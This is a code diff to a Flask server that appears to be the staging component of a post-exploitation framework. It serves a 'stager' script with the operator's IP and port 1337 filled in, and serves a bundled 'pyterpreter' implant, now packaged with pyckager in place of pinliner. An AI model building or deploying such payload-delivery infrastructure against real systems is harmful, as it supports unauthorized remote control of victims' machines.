@@ -1,5 +1,5 @@
 from flask import Flask, send_from_directory, redirect, request
-from pinliner import pinliner
+import pyckager
 from threading import Thread
 from queue import Empty
 import os
@@ -36,42 +36,19 @@ def get_file_with_subs(file, subs: dict):
 
 @app.route('/')
 def stager():
-    return redirect('/resources/stager.sh')
+    return get_file_with_subs('stager.py', {
+        'LOCAL_IP': LOCAL_IP,
+        'WEBSERVER_PORT': '1337'
+    })
 
 
 @app.route('/resources/<resource>')
 def get_resource(resource):
     if resource == 'pyterpreter.py':
-        class DummyOutfile:
-            contents: str
+        return pyckager.process_packages(['pyterpreter', 'core'])
 
-            def __init__(self):
-                self.contents = ''
-
-            def write(self, data: str):
-                self.contents += data
-
-            def close(self):
-                pass
-
-            def tell(self) -> int:
-                return len(self.contents)
-
-        class CFG:
-            default_package = 'pyterpreter'
-            outfile = DummyOutfile()
-            packages = ['pyterpreter', 'core']
-            set_hook = None
-            tagging = False
-
-        pinliner.process_files(CFG)
-        return CFG.outfile.contents
-
-    elif resource == 'stager.sh':
-        return get_file_with_subs(resource, {
-            'LOCAL_IP': LOCAL_IP,
-            'WEBSERVER_PORT': '1337'
-        })
+    elif resource == 'stager.py':
+        return stager()
 
     return send_from_directory('resources', resource)
 
